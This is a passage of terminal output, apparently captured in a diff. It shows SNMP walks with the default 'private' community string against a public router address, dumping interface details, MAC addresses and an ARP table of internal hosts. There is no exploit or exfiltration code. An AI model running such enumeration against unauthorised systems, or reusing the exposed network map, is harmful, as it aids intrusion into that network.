+IF-MIB::ifDescr.7 = STRING: Null0
+IF-MIB::ifDescr.8 = STRING: GigabitEthernet0/0.2
+IF-MIB::ifDescr.9 = STRING: GigabitEthernet0/0.601
+IF-MIB::ifDescr.10 = STRING: NVI0
+IF-MIB::ifDescr.11 = STRING: GigabitEthernet0/1/0.601
+IF-MIB::ifType.1 = INTEGER: ethernetCsmacd(6)
+IF-MIB::ifType.2 = INTEGER: ethernetCsmacd(6)
+IF-MIB::ifType.3 = INTEGER: ethernetCsmacd(6)
+IF-MIB::ifType.4 = INTEGER: ethernetCsmacd(6)
+IF-MIB::ifType.5 = INTEGER: ethernetCsmacd(6)
+IF-MIB::ifType.6 = INTEGER: ethernetCsmacd(6)
+IF-MIB::ifType.7 = INTEGER: other(1)
+IF-MIB::ifType.8 = INTEGER: l2vlan(135)
+IF-MIB::ifType.9 = INTEGER: l2vlan(135)
+IF-MIB::ifType.10 = INTEGER: other(1)
+IF-MIB::ifType.11 = INTEGER: l2vlan(135)
+IF-MIB::ifMtu.1 = INTEGER: 1500
+IF-MIB::ifMtu.2 = INTEGER: 1500
+IF-MIB::ifMtu.3 = INTEGER: 1500
+IF-MIB::ifMtu.4 = INTEGER: 1500
+IF-MIB::ifMtu.5 = INTEGER: 1500
+IF-MIB::ifMtu.6 = INTEGER: 9576
+IF-MIB::ifMtu.7 = INTEGER: 1500
+IF-MIB::ifMtu.8 = INTEGER: 1500
+IF-MIB::ifMtu.9 = INTEGER: 1500
+IF-MIB::ifMtu.10 = INTEGER: 1514
+IF-MIB::ifMtu.11 = INTEGER: 1500
+IF-MIB::ifSpeed.1 = Gauge32: 1000000000
+IF-MIB::ifSpeed.2 = Gauge32: 1000000000
+IF-MIB::ifSpeed.3 = Gauge32: 10000000
+IF-MIB::ifSpeed.4 = Gauge32: 1000000000
+IF-MIB::ifSpeed.5 = Gauge32: 1000000000
+IF-MIB::ifSpeed.6 = Gauge32: 1000000000
+IF-MIB::ifSpeed.7 = Gauge32: 4294967295
+IF-MIB::ifSpeed.8 = Gauge32: 1000000000
+IF-MIB::ifSpeed.9 = Gauge32: 1000000000
+IF-MIB::ifSpeed.10 = Gauge32: 56000
+IF-MIB::ifSpeed.11 = Gauge32: 1000000000
+IF-MIB::ifPhysAddress.1 = STRING: 0:a2:ee:1b:ca:70
+IF-MIB::ifPhysAddress.2 = STRING: 0:a2:ee:1b:ca:78
+IF-MIB::ifPhysAddress.3 = STRING: 0:0:0:0:0:0
+IF-MIB::ifPhysAddress.4 = STRING: 0:a2:ee:1b:ca:68
+IF-MIB::ifPhysAddress.5 = STRING: 0:a2:ee:1b:ca:69
+IF-MIB::ifPhysAddress.6 = STRING: 0:a2:ee:1b:ca:6b
+IF-MIB::ifPhysAddress.7 = STRING:
+IF-MIB::ifPhysAddress.8 = STRING: 0:a2:ee:1b:ca:68
+IF-MIB::ifPhysAddress.9 = STRING: 0:a2:ee:1b:ca:68
+IF-MIB::ifPhysAddress.10 = STRING:
+IF-MIB::ifPhysAddress.11 = STRING: 0:a2:ee:1b:ca:78
+IF-MIB::ifAdminStatus.1 = INTEGER: up(1)
+IF-MIB::ifAdminStatus.2 = INTEGER: up(1)
+IF-MIB::ifAdminStatus.3 = INTEGER: down(2)
+IF-MIB::ifAdminStatus.4 = INTEGER: up(1)
+IF-MIB::ifAdminStatus.5 = INTEGER: up(1)
+IF-MIB::ifAdminStatus.6 = INTEGER: up(1)
+IF-MIB::ifAdminStatus.7 = INTEGER: up(1)
+IF-MIB::ifAdminStatus.8 = INTEGER: up(1)
+IF-MIB::ifAdminStatus.9 = INTEGER: up(1)
+IF-MIB::ifAdminStatus.10 = INTEGER: down(2)
+IF-MIB::ifAdminStatus.11 = INTEGER: up(1)
+IF-MIB::ifOperStatus.1 = INTEGER: up(1)
+IF-MIB::ifOperStatus.2 = INTEGER: up(1)
+IF-MIB::ifOperStatus.3 = INTEGER: down(2)
+IF-MIB::ifOperStatus.4 = INTEGER: up(1)
+IF-MIB::ifOperStatus.5 = INTEGER: up(1)
+IF-MIB::ifOperStatus.6 = INTEGER: up(1)
+IF-MIB::ifOperStatus.7 = INTEGER: up(1)
+IF-MIB::ifOperStatus.8 = INTEGER: up(1)
+IF-MIB::ifOperStatus.9 = INTEGER: up(1)
+IF-MIB::ifOperStatus.10 = INTEGER: down(2)
+IF-MIB::ifOperStatus.11 = INTEGER: up(1)
+IF-MIB::ifLastChange.1 = Timeticks: (2361541991) 273 days, 7:50:19.91
+IF-MIB::ifLastChange.2 = Timeticks: (2361543091) 273 days, 7:50:30.91
+IF-MIB::ifLastChange.3 = Timeticks: (4147) 0:00:41.47
+IF-MIB::ifLastChange.4 = Timeticks: (2111142648) 244 days, 8:17:06.48
+IF-MIB::ifLastChange.5 = Timeticks: (1087493889) 125 days, 20:48:58.89
+IF-MIB::ifLastChange.6 = Timeticks: (3735) 0:00:37.35
+IF-MIB::ifLastChange.7 = Timeticks: (0) 0:00:00.00
+IF-MIB::ifLastChange.8 = Timeticks: (2111142548) 244 days, 8:17:05.48
+IF-MIB::ifLastChange.9 = Timeticks: (2111142548) 244 days, 8:17:05.48
+IF-MIB::ifLastChange.10 = Timeticks: (6837) 0:01:08.37
+IF-MIB::ifLastChange.11 = Timeticks: (2361542991) 273 days, 7:50:29.91
+IF-MIB::ifInOctets.1 = Counter32: 2202844875
+IF-MIB::ifInOctets.2 = Counter32: 2519518406
+IF-MIB::ifInOctets.3 = Counter32: 0
+IF-MIB::ifInOctets.4 = Counter32: 472340753
+IF-MIB::ifInOctets.5 = Counter32: 1448983132
+IF-MIB::ifInOctets.6 = Counter32: 0
+IF-MIB::ifInOctets.7 = Counter32: 0
+IF-MIB::ifInOctets.8 = Counter32: 816717927
+IF-MIB::ifInOctets.9 = Counter32: 3884196017
+IF-MIB::ifInOctets.10 = Counter32: 0
+IF-MIB::ifInOctets.11 = Counter32: 2519750258
+IF-MIB::ifInUcastPkts.1 = Counter32: 3182148968
+IF-MIB::ifInUcastPkts.2 = Counter32: 3051926280
+IF-MIB::ifInUcastPkts.3 = Counter32: 0
+IF-MIB::ifInUcastPkts.4 = Counter32: 33984176
+IF-MIB::ifInUcastPkts.5 = Counter32: 1100475097
+IF-MIB::ifInUcastPkts.6 = Counter32: 0
+IF-MIB::ifInUcastPkts.7 = Counter32: 0
+IF-MIB::ifInUcastPkts.8 = Counter32: 33818768
+IF-MIB::ifInUcastPkts.9 = Counter32: 7792
+IF-MIB::ifInUcastPkts.10 = Counter32: 0
+IF-MIB::ifInUcastPkts.11 = Counter32: 3051929245
+IF-MIB::ifInDiscards.1 = Counter32: 3600
+IF-MIB::ifInDiscards.2 = Counter32: 0
+IF-MIB::ifInDiscards.3 = Counter32: 0
+IF-MIB::ifInDiscards.4 = Counter32: 1104
+IF-MIB::ifInDiscards.5 = Counter32: 62189
+IF-MIB::ifInDiscards.6 = Counter32: 0
+IF-MIB::ifInDiscards.7 = Counter32: 0
+IF-MIB::ifInDiscards.10 = Counter32: 0
+IF-MIB::ifInErrors.1 = Counter32: 2
+IF-MIB::ifInErrors.2 = Counter32: 0
+IF-MIB::ifInErrors.3 = Counter32: 0
+IF-MIB::ifInErrors.4 = Counter32: 34409
+IF-MIB::ifInErrors.5 = Counter32: 0
+IF-MIB::ifInErrors.6 = Counter32: 0
+IF-MIB::ifInErrors.7 = Counter32: 0
+IF-MIB::ifInErrors.10 = Counter32: 0
+IF-MIB::ifInUnknownProtos.1 = Counter32: 0
+IF-MIB::ifInUnknownProtos.2 = Counter32: 0
+IF-MIB::ifInUnknownProtos.3 = Counter32: 0
+IF-MIB::ifInUnknownProtos.4 = Counter32: 1413983
+IF-MIB::ifInUnknownProtos.5 = Counter32: 0
+IF-MIB::ifInUnknownProtos.6 = Counter32: 0
+IF-MIB::ifInUnknownProtos.7 = Counter32: 0
+IF-MIB::ifInUnknownProtos.10 = Counter32: 0
+IF-MIB::ifOutOctets.1 = Counter32: 3871514155
+IF-MIB::ifOutOctets.2 = Counter32: 2929202495
+IF-MIB::ifOutOctets.3 = Counter32: 0
+IF-MIB::ifOutOctets.4 = Counter32: 4174505236
+IF-MIB::ifOutOctets.5 = Counter32: 1396339297
+IF-MIB::ifOutOctets.6 = Counter32: 0
+IF-MIB::ifOutOctets.7 = Counter32: 0
+IF-MIB::ifOutOctets.8 = Counter32: 216574402
+IF-MIB::ifOutOctets.9 = Counter32: 1990328286
+IF-MIB::ifOutOctets.10 = Counter32: 0
+IF-MIB::ifOutOctets.11 = Counter32: 912107859
+IF-MIB::ifOutUcastPkts.1 = Counter32: 2799575729
+IF-MIB::ifOutUcastPkts.2 = Counter32: 3406148744
+IF-MIB::ifOutUcastPkts.3 = Counter32: 0
+IF-MIB::ifOutUcastPkts.4 = Counter32: 215754783
+IF-MIB::ifOutUcastPkts.5 = Counter32: 1260789782
+IF-MIB::ifOutUcastPkts.6 = Counter32: 0
+IF-MIB::ifOutUcastPkts.7 = Counter32: 0
+IF-MIB::ifOutUcastPkts.8 = Counter32: 12544096
+IF-MIB::ifOutUcastPkts.9 = Counter32: 189007759
+IF-MIB::ifOutUcastPkts.10 = Counter32: 0
+IF-MIB::ifOutUcastPkts.11 = Counter32: 3360249086
+IF-MIB::ifOutDiscards.1 = Counter32: 0
+IF-MIB::ifOutDiscards.2 = Counter32: 0
+IF-MIB::ifOutDiscards.3 = Counter32: 0
+IF-MIB::ifOutDiscards.4 = Counter32: 3
+IF-MIB::ifOutDiscards.5 = Counter32: 62202
+IF-MIB::ifOutDiscards.6 = Counter32: 0
+IF-MIB::ifOutDiscards.7 = Counter32: 0
+IF-MIB::ifOutDiscards.10 = Counter32: 0
+IF-MIB::ifOutErrors.1 = Counter32: 0
+IF-MIB::ifOutErrors.2 = Counter32: 0
+IF-MIB::ifOutErrors.3 = Counter32: 0
+IF-MIB::ifOutErrors.4 = Counter32: 0
+IF-MIB::ifOutErrors.5 = Counter32: 0
+IF-MIB::ifOutErrors.6 = Counter32: 0
+IF-MIB::ifOutErrors.7 = Counter32: 0
+IF-MIB::ifOutErrors.10 = Counter32: 0
+~ $ snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.2.1.4.21
+IP-MIB::ip.21 = No Such Object available on this agent at this OID
+~ $ snmpwalk -v2c -c private 105.155.252.6 1.3.6.1.2.1.4.22
+IP-MIB::ipNetToMediaIfIndex.1.105.155.252.5 = INTEGER: 1
+IP-MIB::ipNetToMediaIfIndex.1.105.155.252.6 = INTEGER: 1
+IP-MIB::ipNetToMediaIfIndex.5.105.155.252.65 = INTEGER: 5
+IP-MIB::ipNetToMediaIfIndex.5.105.155.252.66 = INTEGER: 5
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.4 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.5 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.6 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.7 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.8 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.10 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.11 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.12 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.13 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.14 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.16 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.17 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.18 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.19 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.20 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.25 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.26 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.28 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.29 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.30 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.31 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.40 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.51 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.70 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.100 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.114 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.115 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.138 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.140 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.141 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.150 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.151 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.160 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.161 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.178 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.179 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.180 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.181 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.182 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.183 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.191 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.192 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.193 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.194 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.195 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.196 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.221 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.222 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.226 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.227 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.228 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.229 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.231 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.252 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.8.10.236.0.253 = INTEGER: 8
+IP-MIB::ipNetToMediaIfIndex.9.105.155.252.37 = INTEGER: 9
+IP-MIB::ipNetToMediaIfIndex.9.105.155.252.47 = INTEGER: 9
+IP-MIB::ipNetToMediaIfIndex.9.105.155.252.49 = INTEGER: 9
+IP-MIB::ipNetToMediaIfIndex.11.105.155.252.29 = INTEGER: 11
+IP-MIB::ipNetToMediaIfIndex.11.105.155.252.30 = INTEGER: 11
+IP-MIB::ipNetToMediaPhysAddress.1.105.155.252.5 = STRING: e8:a:b9:3a:ca:f9
+IP-MIB::ipNetToMediaPhysAddress.1.105.155.252.6 = STRING: 0:a2:ee:1b:ca:70
+IP-MIB::ipNetToMediaPhysAddress.5.105.155.252.65 = STRING: 0:a2:ee:1b:be:99
+IP-MIB::ipNetToMediaPhysAddress.5.105.155.252.66 = STRING: 0:a2:ee:1b:ca:69
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.4 = STRING: 0:15:5d:a:a0:7
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.5 = STRING: 0:15:5d:a:a1:7
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.6 = STRING: 0:15:5d:a:a0:7
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.7 = STRING: 0:15:5d:a:a0:7
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.8 = STRING: 0:15:5d:a:a0:7
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.10 = STRING: 0:15:5d:a:a0:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.11 = STRING: 0:15:5d:a:a1:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.12 = STRING: 0:15:5d:a:a0:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.13 = STRING: 0:15:5d:a:a0:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.14 = STRING: 0:15:5d:a:a0:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.16 = STRING: 0:15:5d:a:a0:15
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.17 = STRING: 0:15:5d:a:a1:14
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.18 = STRING: 5c:b9:1:c4:10:50
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.19 = STRING: f0:29:29:73:89:c1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.20 = STRING: 5c:b9:1:c4:13:70
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.25 = STRING: 0:15:5d:a:a0:d
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.26 = STRING: 0:15:5d:a:a1:d
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.28 = STRING: 0:15:5d:a:a0:d
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.29 = STRING: 0:15:5d:a:a0:d
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.30 = STRING: 0:90:c2:ef:3e:74
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.31 = STRING: 0:90:c2:f2:8a:80
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.40 = STRING: 0:20:e:10:9e:cf
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.51 = STRING: 0:20:e:10:9e:dd
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.70 = STRING: 0:20:e:10:93:f
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.100 = STRING: 0:1:95:2f:77:34
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.114 = STRING: 0:c0:b7:eb:a4:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.115 = STRING: 0:c0:b7:eb:ef:6d
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.138 = STRING: 0:15:5d:a:a0:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.140 = STRING: 0:15:5d:a:a0:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.141 = STRING: 0:15:5d:a:a0:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.150 = STRING: c0:25:5c:ff:66:41
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.151 = STRING: 0:21:1c:42:12:41
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.160 = STRING: 28:80:23:ad:61:a7
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.161 = STRING: 28:80:23:b3:62:c7
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.178 = STRING: 0:0:c:7:ac:2
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.179 = STRING: 0:a2:ee:1b:be:98
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.180 = STRING: 0:a2:ee:1b:ca:68
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.181 = STRING: 0:fe:c8:37:27:42
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.182 = STRING: 0:fe:c8:37:2b:2
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.183 = STRING: 0:0:c:7:ac:1
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.191 = STRING: 94:57:a5:59:c7:64
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.192 = STRING: 94:57:a5:69:e9:22
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.193 = STRING: 94:57:a5:59:c7:64
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.194 = STRING: 94:57:a5:59:5:9c
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.195 = STRING: 94:57:a5:69:4f:5c
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.196 = STRING: 94:57:a5:59:5:9c
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.221 = STRING: 94:57:a5:61:59:14
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.222 = STRING: 94:57:a5:69:d9:d4
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.226 = STRING: 5c:b9:1:c4:10:53
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.227 = STRING: 5c:b9:1:c4:13:73
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.228 = STRING: 0:c0:ff:25:7e:ed
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.229 = STRING: 0:c0:ff:25:8f:42
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.231 = STRING: 0:e0:86:23:24:59
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.252 = STRING: 0:12:5:0:59:cd
+IP-MIB::ipNetToMediaPhysAddress.8.10.236.0.253 = STRING: 0:12:5:0:59:d0
+IP-MIB::ipNetToMediaPhysAddress.9.105.155.252.37 = STRING: 0:a2:ee:1b:ca:68
+IP-MIB::ipNetToMediaPhysAddress.9.105.155.252.47 = STRING: 94:57:a5:59:c7:66
+IP-MIB::ipNetToMediaPhysAddress.9.105.155.252.49 = STRING: 0:b9:1:c4:13:71
+IP-MIB::ipNetToMediaPhysAddress.11.105.155.252.29 = STRING: 0:a2:ee:1b:ca:78
+IP-MIB::ipNetToMediaPhysAddress.11.105.155.252.30 = STRING: 4:f9:38:e7:51:d0
+IP-MIB::ipNetToMediaNetAddress.1.105.155.252.5 = IpAddress: 105.155.252.5
+IP-MIB::ipNetToMediaNetAddress.1.105.155.252.6 = IpAddress: 105.155.252.6
+IP-MIB::ipNetToMediaNetAddress.5.105.155.252.65 = IpAddress: 105.155.252.65
+IP-MIB::ipNetToMediaNetAddress.5.105.155.252.66 = IpAddress: 105.155.252.66
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.4 = IpAddress: 10.236.0.4
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.5 = IpAddress: 10.236.0.5
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.6 = IpAddress: 10.236.0.6
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.7 = IpAddress: 10.236.0.7
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.8 = IpAddress: 10.236.0.8
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.10 = IpAddress: 10.236.0.10
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.11 = IpAddress: 10.236.0.11
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.12 = IpAddress: 10.236.0.12
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.13 = IpAddress: 10.236.0.13
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.14 = IpAddress: 10.236.0.14
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.16 = IpAddress: 10.236.0.16
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.17 = IpAddress: 10.236.0.17
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.18 = IpAddress: 10.236.0.18
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.19 = IpAddress: 10.236.0.19
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.20 = IpAddress: 10.236.0.20
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.25 = IpAddress: 10.236.0.25
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.26 = IpAddress: 10.236.0.26
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.28 = IpAddress: 10.236.0.28
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.29 = IpAddress: 10.236.0.29
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.30 = IpAddress: 10.236.0.30
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.31 = IpAddress: 10.236.0.31
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.40 = IpAddress: 10.236.0.40
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.51 = IpAddress: 10.236.0.51
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.70 = IpAddress: 10.236.0.70
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.100 = IpAddress: 10.236.0.100
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.114 = IpAddress: 10.236.0.114
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.115 = IpAddress: 10.236.0.115
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.138 = IpAddress: 10.236.0.138
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.140 = IpAddress: 10.236.0.140
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.141 = IpAddress: 10.236.0.141
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.150 = IpAddress: 10.236.0.150
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.151 = IpAddress: 10.236.0.151
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.160 = IpAddress: 10.236.0.160
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.161 = IpAddress: 10.236.0.161
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.178 = IpAddress: 10.236.0.178
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.179 = IpAddress: 10.236.0.179
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.180 = IpAddress: 10.236.0.180
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.181 = IpAddress: 10.236.0.181
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.182 = IpAddress: 10.236.0.182
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.183 = IpAddress: 10.236.0.183
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.191 = IpAddress: 10.236.0.191
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.192 = IpAddress: 10.236.0.192
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.193 = IpAddress: 10.236.0.193
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.194 = IpAddress: 10.236.0.194
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.195 = IpAddress: 10.236.0.195
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.196 = IpAddress: 10.236.0.196
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.221 = IpAddress: 10.236.0.221
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.222 = IpAddress: 10.236.0.222
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.226 = IpAddress: 10.236.0.226
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.227 = IpAddress: 10.236.0.227
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.228 = IpAddress: 10.236.0.228
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.229 = IpAddress: 10.236.0.229
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.231 = IpAddress: 10.236.0.231
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.252 = IpAddress: 10.236.0.252
+IP-MIB::ipNetToMediaNetAddress.8.10.236.0.253 = IpAddress: 10.236.0.253
+IP-MIB::ipNetToMediaNetAddress.9.105.155.252.37 = IpAddress: 105.155.252.37
+IP-MIB::ipNetToMediaNetAddress.9.105.155.252.47 = IpAddress: 105.155.252.47
+IP-MIB::ipNetToMediaNetAddress.9.105.155.252.49 = IpAddress: 105.155.252.49
+IP-MIB::ipNetToMediaNetAddress.11.105.155.252.29 = IpAddress: 105.155.252.29
+IP-MIB::ipNetToMediaNetAddress.11.105.155.252.30 = IpAddress: 105.155.252.30
+IP-MIB::ipNetToMediaType.1.105.155.252.5 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.1.105.155.252.6 = INTEGER: static(4)
+IP-MIB::ipNetToMediaType.5.105.155.252.65 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.5.105.155.252.66 = INTEGER: static(4)
+IP-MIB::ipNetToMediaType.8.10.236.0.4 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.5 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.6 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.7 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.8 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.10 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.11 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.12 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.13 = INTEGER: dynamic(3)
+IP-MIB::ipNetToMediaType.8.10.236.0.14 = INTEGER: dynamic(3)
